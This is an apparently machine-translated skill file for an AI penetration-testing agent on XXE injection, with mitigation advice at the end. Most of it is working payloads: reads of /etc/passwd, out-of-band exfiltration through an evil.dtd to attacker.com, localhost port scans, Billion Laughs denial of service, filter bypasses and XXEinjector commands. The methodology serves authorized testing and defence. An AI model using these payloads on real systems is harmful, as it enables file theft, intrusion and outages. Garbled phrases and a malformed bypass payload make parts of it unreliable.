---
name: xxe-testing
Professional skills and methodology for infusion of testing by external entities
version: 1.0.0
---

# XXE XMLInjection test for external entities

## Overview

This skill provides detection, use, and protection against XXE holes.

## Vulnerability Principle

XML parser may read local files, carry out SSRF attacks or cause denial of service when handling external entities.
- XMLDocument Parsing
- SOAPServices
- Office documents (. docx,. xx, etc.)
- SVGPictures
- PDFDocumentation

## Test Method

### 1. Identification of XML input points

- File Uploading
- API interface accepts XML data
- SOAPRequest
- OfficeDocument Processing
- Data import function

### 2. Basic XXE test

**Test external entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Test network request (SSRF):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. Blind XXE testing

**When the response does not show content directly:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?file=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**Entity using parameter:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**evil. dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
```

## Exploitation Techniques

### File Read

**Read local files:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**zzozz path:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### SSRFAttack

**Intranet detection:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**Port scan:**
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
```

### Denial of Service

**Billion Laughs attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

### OfficeDocumentXXE

**docx file structure:**
```
word/document.xml - Include Document Contents
word/_rels/document.xml.rels - Include external references
```

**Changes to document. xml.rels:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

## Bypass Techniques

### Different agreements

**PHP:**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

**Java:**
```xml
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
```

**Encoded around:**
```xml
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### Parameters entity

**Using parameter entities to circumvent certain limitations:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>
```

## Using the Tools

### XXEinjector

```bash
# Basic use
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

# File Read
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

### Burp Suite

1. Interception of requests containing XML
2. Send toRepeater
3. Modify XML content to add external entity
4. Observing response or extrapolated data

## Verification and Reporting

### Verification Steps

1. Confirm XML parser for external entities
2. Verify whether the file has been read or SSRFed successfully
3. Assessment of the scope of impact (sensitive documentation, Intranet access, etc.)
4. Record the completePOC
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist

- Leak position and XML input point
- Readable files or accessible intranet resources
- the complete exploitation steps andPoC
- Remediation recommendations (disable external entities, use of white lists, etc.)

## Preventive Measures

### Recommended Approach

1. **Disable external entities**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Validate with White List**
   - Validate XML structures
   - Restriction of permitted entities

3. **Use a secure parser**
   - Use a parser that does not process DTD
   - Use JSON to replace XML

## Important Notes

- Perform only in an authorized testing environment
- Avoid reading sensitive files leading to data leaks
- Pay attention to the differences in the XXE processing of different languages and libraries
- Note file formatting when testing Office documents